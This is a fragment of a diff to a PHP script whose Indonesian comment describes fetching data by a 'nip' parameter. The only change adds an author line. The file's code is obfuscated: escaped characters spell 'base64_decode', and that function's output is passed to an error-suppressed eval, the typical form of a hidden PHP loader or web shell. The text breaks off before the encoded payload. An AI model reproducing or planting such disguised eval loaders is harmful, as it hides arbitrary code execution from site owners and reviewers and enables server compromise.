@@ -1,5 +1,6 @@
 <?php
 /*
+author :rahadianaa
 untuk get data menggunakan parameter nip
 */
 $l61a2214="\142\x61\x73\x65\x36\x34\137\144\x65\x63\157\x64\x65";@eval($l61a2214(
